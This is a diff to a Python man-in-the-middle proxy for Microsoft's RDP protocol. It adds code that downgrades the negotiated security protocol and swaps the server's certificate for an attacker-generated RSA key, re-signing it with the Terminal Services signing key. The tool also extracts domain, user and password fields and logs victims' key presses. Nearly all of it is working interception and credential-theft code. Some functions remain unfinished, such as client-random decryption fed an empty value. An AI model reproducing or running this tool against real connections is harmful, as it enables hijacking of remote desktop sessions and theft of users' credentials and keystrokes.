@@ -20,6 +20,7 @@ import select
 import struct
 import time
 import rsa
+import hashlib
 
 
 parser = argparse.ArgumentParser(
@@ -53,13 +54,15 @@ TERM_SIGN_PRIV_KEY = { # little endian, from [MS-RDPBCGR].pdf
           0x63, 0x65, 0x6b, 0x58, 0x3a, 0xfe, 0xef, 0x7c, 0xe7, 0xbf, 0xfe,
           0x3d, 0xf6, 0x5c, 0x7d, 0x6c, 0x5e, 0x06, 0x09, 0x1a, 0xf5, 0x61,
           0xbb, 0x20, 0x93, 0x09, 0x5f, 0x05, 0x6d, 0xea, 0x87 ],
+                      # modulus
     "d": [ 0x87, 0xa7, 0x19, 0x32, 0xda, 0x11, 0x87, 0x55, 0x58, 0x00, 0x16,
           0x16, 0x25, 0x65, 0x68, 0xf8, 0x24, 0x3e, 0xe6, 0xfa, 0xe9, 0x67,
           0x49, 0x94, 0xcf, 0x92, 0xcc, 0x33, 0x99, 0xe8, 0x08, 0x60, 0x17,
           0x9a, 0x12, 0x9f, 0x24, 0xdd, 0xb1, 0x24, 0x99, 0xc7, 0x3a, 0xb8,
           0x0a, 0x7b, 0x0d, 0xdd, 0x35, 0x07, 0x79, 0x17, 0x0b, 0x51, 0x9b,
           0xb3, 0xc7, 0x10, 0x01, 0x13, 0xe7, 0x3f, 0xf3, 0x5f ],
-    "e": [ 0x5b, 0x7b, 0x88, 0xc0 ]
+                      # private exponent
+    "e": [ 0x5b, 0x7b, 0x88, 0xc0 ] # public exponent
 }
 
 def substr(s, offset, count):
@@ -118,28 +121,27 @@ def extract_server_cert(bytes):
     encryption_level = struct.unpack('<I', substr(bytes, offset+6, 4))[0]
     server_random_len = struct.unpack('<I', substr(bytes, offset+10, 4))[0]
     server_cert_len = struct.unpack('<I', substr(bytes, offset+14, 4))[0]
-    server_random = substr(bytes, offset+16, server_random_len)
-    server_cert = substr(bytes, offset+16+server_random_len, server_cert_len)
+    server_random = substr(bytes, offset+18, server_random_len)
+    server_cert = substr(bytes, offset+18+server_random_len,
+                         server_cert_len)
 
     #  cert_version = struct.unpack('<I', server_cert[:4])[0]
         # 1 = Proprietary
         # 2 = x509
         # TODO ignore right most bit
 
-    prop_cert_data = server_cert[2:]
-    ## wtf, does not follow proto^col, excpected a 4 here
-    dwVersion = struct.unpack('<I', substr(prop_cert_data, 0, 4))[0]
-    dwSigAlg = struct.unpack('<I', substr(prop_cert_data, 4, 4))[0]
-    dwKeyAlg = struct.unpack('<I', substr(prop_cert_data, 8, 4))[0]
+    dwVersion = struct.unpack('<I', substr(server_cert, 0, 4))[0]
+    dwSigAlg = struct.unpack('<I', substr(server_cert, 4, 4))[0]
+    dwKeyAlg = struct.unpack('<I', substr(server_cert, 8, 4))[0]
 
-    pubkey_type = struct.unpack('<H', substr(prop_cert_data, 12, 2))[0]
-    pubkey_len = struct.unpack('<H', substr(prop_cert_data, 14, 2))[0]
-    pubkey = substr(prop_cert_data, 16, pubkey_len)
+    pubkey_type = struct.unpack('<H', substr(server_cert, 12, 2))[0]
+    pubkey_len = struct.unpack('<H', substr(server_cert, 14, 2))[0]
+    pubkey = substr(server_cert, 16, pubkey_len)
     assert pubkey[:4] == b"RSA1"
 
-    sig_type = struct.unpack('<H', substr(prop_cert_data, 20+pubkey_len, 2))[0]
-    sig_len = struct.unpack('<H', substr(prop_cert_data, 22+pubkey_len, 2))[0]
-    sig = substr(prop_cert_data, 24+pubkey_len, sig_len)
+    sign_type = struct.unpack('<H', substr(server_cert, 16+pubkey_len, 2))[0]
+    sign_len = struct.unpack('<H', substr(server_cert, 18+pubkey_len, 2))[0]
+    sign = substr(server_cert, 20+pubkey_len, sign_len)
 
     key_len = struct.unpack('<I', substr(pubkey, 4, 4))[0]
     bit_len = struct.unpack('<I', substr(pubkey, 8, 4))[0]
@@ -148,20 +150,41 @@ def extract_server_cert(bytes):
     pub_exp = struct.unpack('<I', substr(pubkey, 16, 4))[0]
     modulus = substr(pubkey, 20, key_len)
 
-    global server_crypto
-    server_crypto = {"modulus": modulus,
+    first5fields = struct.pack("<IIIHH",
+                    dwVersion,
+                    dwSigAlg,
+                    dwKeyAlg,
+                    pubkey_type,
+                    pubkey_len )
+    global original_crypto
+    original_crypto = {"modulus": modulus,
                      "pub_exponent": pub_exp,
                      "data_len": data_len,
                      "server_rand": server_random, # little endian
-                     "sig": sig,
+                     "sign": sign,
+                     "first5fields": first5fields,
+                     "client_rand_seen": b"",
                     }
-    server_crypto["pubkey"] = rsa.PublicKey(
+    original_crypto["pubkey"] = rsa.PublicKey(
         int.from_bytes(modulus, "little"),
-        int.from_bytes(pub_exp, "little"),
+        pub_exp,
     )
-    #  print(server_crypto)
+    #  print(original_crypto)
 
-    return b"Server cert modulus: " + binascii.hexlify(modulus)
+    return (b"Server cert modulus: " + binascii.hexlify(modulus) +
+            b"\nSignature: " + binascii.hexlify(sign) )
+
+
+def extract_client_random(bytes):
+    global original_crypto
+    if original_crypto["client_rand_seen"] == b"":
+        client_rand = b""
+        client_rand = rsa_decrypt(client_rand)
+        original_crypto["client_rand_seen"] = client_rand
+
+        return(b"Client random: " + client_rand)
+    return b""
+
 
 
 def extract_credentials(bytes, m):
@@ -188,6 +211,8 @@ def extract_credentials(bytes, m):
         struct.unpack('>H', binascii.unhexlify(x))[0]
         for x in m.groups()
     ]
+    # TODO ordentlich machen
+    # TODO und locale+layout holen
     offset = 36
     domain = bytes[offset:offset+domlen]
     user = bytes[offset+domlen+2:offset+domlen+2+userlen]
@@ -196,40 +221,48 @@ def extract_credentials(bytes, m):
 
 
 def extract_key_press(bytes):
-    event = bytes[-5]
-    key = bytes[-4] # TODO map scancode to ascii
+    if len(bytes)>4:
+        event = bytes[-5]
+        key = bytes[-4]
+    else:
+        event = bytes[2]
+        key = bytes[3]
+    # TODO map scancode to ascii
+    # get language locale and keyboard layout
     if event == 0:
         return b"Key press:   %d" % key
-    elif event == 192:
+    elif event == 192 or event == 1:
         return b"Key release: %d" % key
 
 
 def replace_server_cert(bytes):
-    global server_crypto
+    global original_crypto
     global my_keys
-    key_len = server_crypto["modulus"]//8 - 8
-    (pubkey, privkey) = rsa.newkeys(key_len)
+    old_sig = sign_certificate(original_crypto["first5fields"] +
+                               original_crypto["modulus"])
+    assert old_sig == original_crypto["sign"]
+    key_len = len(original_crypto["modulus"])-8
+    (pubkey, privkey) = rsa.newkeys(key_len*8)
     my_keys = {"pubkey": pubkey, "privkey": privkey}
-    term_server_privkey = rsa.PrivateKey(
-        int.from_bytes(TERM_SIGN_PRIV_KEY["n"], "little"),
-        int.from_bytes(TERM_SIGN_PRIV_KEY["e"], "little"),
-        int.from_bytes(TERM_SIGN_PRIV_KEY["d"], "little"),
-        # TODO p,q
-        # https://crypto.stackexchange.com/questions/11509/computing-p-and-q-from-private-key
-    )
-    result = re.sub(server_crypto["modulus"],
-           pubkey.n.to_bytes(key_len, "little") + b"\x00"*8,
-           bytes
-          )
-    new_sig = sign_my_cert(pubkey, term_server_privkey)
-    result = re.sub(server_crypto["sig"], new_sig, bytes)
+    new_modulus = pubkey.n.to_bytes(key_len + 8, "little")
+    result = bytes.replace(original_crypto["modulus"], new_modulus)
+    new_sig = sign_certificate(original_crypto["first5fields"] + new_modulus)
+    result = result.replace(original_crypto["sign"], new_sig)
 
     return result
 
 
-def sign_my_cert(pubkey, privkey):
+def sign_certificate(bytes):
     """Signs the public key with the private key"""
-    return ""
+    m = hashlib.md5()
+    m.update(bytes)
+    m = m.digest() + b"\x00" + b"\xff"*45 + b"\x01"
+    m = int.from_bytes(m, "little")
+    d = int.from_bytes(TERM_SIGN_PRIV_KEY["d"], "little")
+    n = int.from_bytes(TERM_SIGN_PRIV_KEY["n"], "little")
+    s = pow(m, d, n)
+    return s.to_bytes(len(original_crypto["sign"]), "little")
+
 
 def parse_rdp(bytes):
 
@@ -257,7 +290,7 @@ def parse_rdp(bytes):
     if m:
         result = extract_server_cert(bytes)
 
-    keypress_regex = b"\x03\x00\x001"
+    keypress_regex = b"\x03\x00\x001|\x44\x04.."
     m = re.match(keypress_regex, bytes)
     if m:
         result = extract_key_press(bytes)
@@ -271,16 +304,43 @@ def parse_rdp(bytes):
     if not result == b"" and not result == None:
         print("\033[31m%s\033[0m" % result.decode())
 
+
+def tamper_data(bytes):
+    result = bytes
+    cred_regex = b".*020c.*%s" % binascii.hexlify(b"RSA1")
+    m = re.match(cred_regex, binascii.hexlify(bytes))
+    if m:
+        result = replace_server_cert(bytes)
+
+    cred_regex = b".*%s..010c" % binascii.hexlify(b"McDn")
+    m = re.match(cred_regex, binascii.hexlify(bytes))
+    if m:
+        result = set_fake_requested_protocol(bytes, m)
+    if not result == bytes and args.debug:
+        print("Tampered data:")
+        hexdump(result)
+    return result
+
+
+def set_fake_requested_protocol(bytes, m):
+    offset = len(m.group())//2 
+    result = bytes[:offset+6] + chr(RDP_PROTOCOL_OLD).encode() + bytes[offset+7:]
+    return result
+
 #  with open("data/server_cert.bytes", 'rb') as f:
 #      bytes = f.read()
 #  parse_rdp(bytes)
+#  parse_rdp(tamper_data(bytes))
 #  exit(1)
+
+
 
 def downgrade_auth(bytes):
     cred_regex = b".*..00..00.{8}$"
     m = re.match(cred_regex, binascii.hexlify(bytes))
     global RDP_PROTOCOL
-    RDP_PROTOCOL = bytes[-4]
+    global RDP_PROTOCOL_OLD
+    RDP_PROTOCOL = RDP_PROTOCOL_OLD = bytes[-4]
     # Flags:
     # 0: standard rdp security
     # 1: TLS ontop of that
@@ -311,7 +371,6 @@ def dump_data(data, From=None, Modified=False):
             print("From client:"+modified)
 
         hexdump(data)
-
 
 
 def handle_protocol_negotiation():
@@ -357,6 +416,7 @@ def forward_data():
             if data == b"": return close()
             dump_data(data, From="Client")
             parse_rdp(data)
+            data = tamper_data(data)
             remote_socket.send(data)
         elif s_in == remote_socket:
             data = s_in.recv(4096)
@@ -366,6 +426,7 @@ def forward_data():
             if data == b"": return close()
             dump_data(data, From="Server")
             parse_rdp(data)
+            data = tamper_data(data)
             local_conn.send(data)
     return True
 
@@ -375,6 +436,7 @@ def original_dest(s):
     sockaddr_in = s.getsockopt(socket.SOL_IP, SO_ORIGINAL_DEST, 16)
     (proto, port, a, b, c, d) = struct.unpack('!HHBBBB', sockaddr_in[:8])
     return "%d.%d.%d.%d:%d" % (a, b, c, d, port)
+
 
 def open_sockets():
     global local_conn
